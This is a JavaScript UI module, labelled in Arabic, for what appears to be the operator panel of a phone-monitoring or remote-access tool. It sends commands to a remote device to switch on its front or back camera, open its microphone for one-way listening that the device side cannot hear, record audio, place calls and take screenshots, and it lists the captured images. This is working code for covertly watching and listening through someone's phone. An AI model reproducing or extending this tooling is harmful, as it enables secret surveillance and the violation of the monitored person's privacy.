import { h, fmtDateTime, emptyState, errorBox } from "../util.js";

/** قسم البث المباشر: الكاميرات، المايك (استماع أحادي)، التسجيل اللحظي، الاتصال، اللقطات. */
export function render(container, ctx) {
  container.innerHTML = "";
  const root = h("div", { class: "live-section" });
  container.append(root);

  const cams = h("div", { class: "live-grid" });
  root.append(h("h3", { class: "panel-title", text: "الكاميرات" }), cams);
  cams.append(
    toggleCard("الكاميرا الأمامية", "camera_front_start", "camera_stop", ctx),
    toggleCard("الكاميرا الخلفية", "camera_back_start", "camera_stop", ctx),
  );

  root.append(h("h3", { class: "panel-title", text: "المايك" }));
  root.append(toggleCard("فتح المايك (استماع فقط)", "mic_start", "mic_stop", ctx, true));

  const actions = h("div", { class: "actions-row" });
  const recBtn = h("button", { class: "action-btn", type: "button" }, [
    h("span", { text: "🎙️" }), h("span", { text: "تسجيل لحظي" }),
  ]);
  recBtn.addEventListener("click", () => run("record_mic", {}, ctx));

  const callBtn = h("button", { class: "action-btn", type: "button" }, [
    h("span", { text: "📞" }), h("span", { text: "اتصال" }),
  ]);
  callBtn.addEventListener("click", async () => {
    const res = await ctx.modal({
      title: "اتصال",
      message: "أدخل رقم الهاتف",
      fields: [{ name: "number", label: "الرقم", placeholder: "05xxxxxxxx", required: true }],
      okText: "اتصال",
    });
    if (res) run("make_call", res, ctx);
  });

  const shotBtn = h("button", { class: "action-btn", type: "button" }, [
    h("span", { text: "🖥️" }), h("span", { text: "لقطة شاشة" }),
  ]);
  shotBtn.addEventListener("click", () => run("take_screenshot", {}, ctx));

  actions.append(recBtn, callBtn, shotBtn);
  root.append(h("h3", { class: "panel-title", text: "أوامر سريعة" }), actions);

  root.append(h("h3", { class: "panel-title", text: "آخر اللقطات" }));
  const list = h("div", { class: "media-grid" });
  root.append(list);

  const unsub = ctx.data.subscribeCollection(ctx.uid, ctx.deviceId, "media", (items, err) => {
    list.innerHTML = "";
    if (err) {
      list.append(errorBox("تعذر تحميل اللقطات"));
      return;
    }
    const images = (items || [])
      .filter((m) => String(m.type || m.mimeType || "").includes("image"))
      .slice(0, 12);
    if (!images.length) {
      list.append(emptyState("📷", "لا توجد لقطات بعد"));
      return;
    }
    for (const m of images) {
      list.append(lazyImageCard(m));
    }
  });

  return () => { try { unsub(); } catch { /* تجاهل */ } };
}

function toggleCard(title, startCmd, stopCmd, ctx, hint = false) {
  const cb = h("input", { type: "checkbox" });
  const children = [
    h("label", { class: "live-check" }, [cb, h("span", { class: "panel-title", text: title })]),
  ];
  if (hint) {
    children.push(h("div", {
      class: "muted",
      style: "font-size:12px;margin-top:6px",
      text: "استماع أحادي الاتجاه: تسمع من الجهاز ولا يُسمع الجهاز منك.",
    }));
  }
  const card = h("div", { class: "live-card card" }, children);
  cb.addEventListener("change", () => run(cb.checked ? startCmd : stopCmd, {}, ctx));
  return card;
}

function lazyImageCard(m) {
  const url = m.url || "";
  const card = h("div", { class: "media-item" }, [
    h("div", { class: "media-thumb placeholder", text: "🖼️" }),
    h("div", { class: "media-name", text: m.name || "لقطة" }),
    h("div", { class: "media-meta muted", text: fmtDateTime(m.timestamp) }),
    url
      ? h("button", { class: "btn ghost sm media-open", type: "button", text: "عرض" })
      : h("div", { class: "media-meta muted", text: "لا يوجد رابط" }),
  ]);
  if (url) {
    const btn = card.querySelector(".media-open");
    btn.addEventListener("click", () => {
      const img = h("img", { class: "media-thumb", src: url, alt: m.name || "", loading: "lazy", decoding: "async" });
      img.addEventListener("click", () => window.open(url, "_blank"));
      card.replaceChild(img, card.querySelector(".media-thumb"));
      btn.remove();
      card.append(h("a", { class: "media-meta", href: url, target: "_blank", rel: "noopener", text: "فتح / تنزيل ⬇" }));
    });
  }
  return card;
}

function run(type, payload, ctx) {
  ctx.data
    .sendCommand(ctx.uid, ctx.deviceId, type, payload)
    .then(() => ctx.toast("تم إرسال الأمر"))
    .catch(() => ctx.toast("تعذر إرسال الأمر", "error"));
}
